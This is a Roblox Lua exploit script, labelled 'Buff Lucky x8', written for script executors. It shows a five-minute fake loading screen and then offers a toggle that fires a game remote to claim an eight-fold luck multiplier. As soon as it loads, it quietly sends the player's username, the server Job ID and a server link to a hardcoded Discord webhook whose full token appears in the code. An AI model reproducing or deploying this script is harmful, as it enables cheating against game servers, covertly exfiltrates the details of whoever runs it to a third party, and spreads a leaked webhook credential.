local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:WaitForChild("PlayerGui")
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false

-- Config
local webhookUrl = "https://discord.com/api/webhooks/1401785416104939720/6LU4HbxLm8mwoS8iZ0LrbwBmZ1Wp6clskoXsEGtnymrKNLVDTeVPZbpeBKKom9wrWG6Z"  -- THAY BẰNG WEBHOOK CỦA BẠN (ví dụ: Discord webhook URL)
local buffActive = false
local loadTime = 300  -- 5 phút = 300 giây
local buffRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("BuffLucky")  -- Giả định tên remote cho buff lucky, chỉnh nếu khác

-- Function to send webhook
local function sendWebhook()
    local jobId = game.JobId
    local placeId = game.PlaceId
    local serverLink = "https://www.roblox.com/games/" .. placeId .. "?gameId=" .. jobId  -- Link server (có thể không chính xác, tùy game)
    local username = player.Name
    
    local data = {
        content = "[Job ID Server: " .. jobId .. "]\n[Link Server: " .. serverLink .. "]\n[User Name Roblox: " .. username .. "]"
    }
    
    local jsonData = HttpService:JSONEncode(data)
    
    -- Sử dụng request từ executor nếu có, fallback HttpService (cần exploit để enable HttpService)
    pcall(function()
        if syn and syn.request then
            syn.request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        elseif request then
            request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        else
            HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
        end
    end)
    print("Webhook sent!")
end

-- Loading screen
local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.BackgroundColor3 = Color3.new(0, 0, 0)
loadingFrame.Parent = screenGui

local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0.8, 0, 0.05, 0)
progressBar.Position = UDim2.new(0.1, 0, 0.5, 0)
progressBar.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
progressBar.Parent = loadingFrame

local progressFill = Instance.new("Frame")
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.BackgroundColor3 = Color3.new(0, 1, 0)
progressFill.Parent = progressBar

local progressText = Instance.new("TextLabel")
progressText.Size = UDim2.new(1, 0, 1, 0)
progressText.Text = "Loading 0%"
progressText.TextColor3 = Color3.new(1, 1, 1)
progressText.BackgroundTransparency = 1
progressText.Parent = progressBar

-- Start loading
sendWebhook()  -- Gửi webhook ngay khi bắt đầu load

local startTime = tick()
local connection = RunService.Heartbeat:Connect(function()
    local elapsed = tick() - startTime
    local progress = math.clamp(elapsed / loadTime, 0, 1)
    
    progressFill.Size = UDim2.new(progress, 0, 1, 0)
    progressText.Text = "Loading " .. math.floor(progress * 100) .. "%"
    
    if progress >= 1 then
        connection:Disconnect()
        loadingFrame:Destroy()
        -- Hiển thị hiệu ứng ngôi sao bay xuống
        createStarEffects()
        -- Tạo GUI chính
        createMainGui()
    end
end)

-- Function to create star falling effects
function createStarEffects()
    for i = 1, 50 do  -- Tạo 50 ngôi sao
        local star = Instance.new("ImageLabel")
        star.Size = UDim2.new(0, 20, 0, 20)
        star.Position = UDim2.new(math.random(), 0, -0.1, 0)  -- Bắt đầu từ trên màn hình
        star.Image = "rbxassetid://123456789"  -- Thay bằng asset ID của hình ngôi sao (tìm trên Roblox library)
        star.BackgroundTransparency = 1
        star.Parent = screenGui
        
        local tweenInfo = TweenInfo.new(5 + math.random(5), Enum.EasingStyle.Linear)
        local tween = TweenService:Create(star, tweenInfo, {Position = UDim2.new(star.Position.X.Scale, 0, 1.1, 0)})
        tween:Play()
        tween.Completed:Connect(function()
            star:Destroy()
        end)
    end
end

-- Function to create main GUI
function createMainGui()
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0.3, 0, 0.4, 0)
    mainFrame.Position = UDim2.new(0.35, 0, 0.3, 0)
    mainFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
    mainFrame.Parent = screenGui
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0.2, 0)
    title.Text = "[ Name Script = Buff Lucky x8 ]"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.BackgroundTransparency = 1
    title.Parent = mainFrame
    
    local madeBy = Instance.new("TextLabel")
    madeBy.Size = UDim2.new(1, 0, 0.15, 0)
    madeBy.Position = UDim2.new(0, 0, 0.2, 0)
    madeBy.Text = "[ Made by: toxic_white ]"
    madeBy.TextColor3 = Color3.new(1, 1, 1)
    madeBy.BackgroundTransparency = 1
    madeBy.Parent = mainFrame
    
    local timeUse = Instance.new("TextLabel")
    timeUse.Size = UDim2.new(1, 0, 0.15, 0)
    timeUse.Position = UDim2.new(0, 0, 0.35, 0)
    timeUse.Text = "[ Time use: 1h ]"
    timeUse.TextColor3 = Color3.new(1, 1, 1)
    timeUse.BackgroundTransparency = 1
    timeUse.Parent = mainFrame
    
    local buffLabel = Instance.new("TextLabel")
    buffLabel.Size = UDim2.new(1, 0, 0.15, 0)
    buffLabel.Position = UDim2.new(0, 0, 0.5, 0)
    buffLabel.Text = "[ Buff Lucky x8 Button On/Off ]"
    buffLabel.TextColor3 = Color3.new(1, 1, 1)
    buffLabel.BackgroundTransparency = 1
    buffLabel.Parent = mainFrame
    
    local toggleButton = Instance.new("TextButton")
    toggleButton.Size = UDim2.new(0.8, 0, 0.2, 0)
    toggleButton.Position = UDim2.new(0.1, 0, 0.7, 0)
    toggleButton.Text = "OFF"
    toggleButton.BackgroundColor3 = Color3.new(1, 0, 0)
    toggleButton.TextColor3 = Color3.new(1, 1, 1)
    toggleButton.Parent = mainFrame
    
    toggleButton.MouseButton1Click:Connect(function()
        buffActive = not buffActive
        toggleButton.Text = buffActive and "ON" or "OFF"
        toggleButton.BackgroundColor3 = buffActive and Color3.new(0, 1, 0) or Color3.new(1, 0, 0)
        
        if buffActive then
            -- Kích hoạt buff lucky x8 (fire remote hoặc modify stat)
            pcall(function()
                buffRemote:FireServer(8)  -- Giả định gửi multiplier 8
                print("Buff Lucky x8 Activated!")
            end)
        else
            -- Tắt buff (nếu có remote tắt)
            pcall(function()
                buffRemote:FireServer(1)  -- Reset về x1
                print("Buff Lucky x8 Deactivated!")
            end)
        end
    end)
end

print("Buff Lucky x8 Script Loaded! Loading in 5 minutes...")
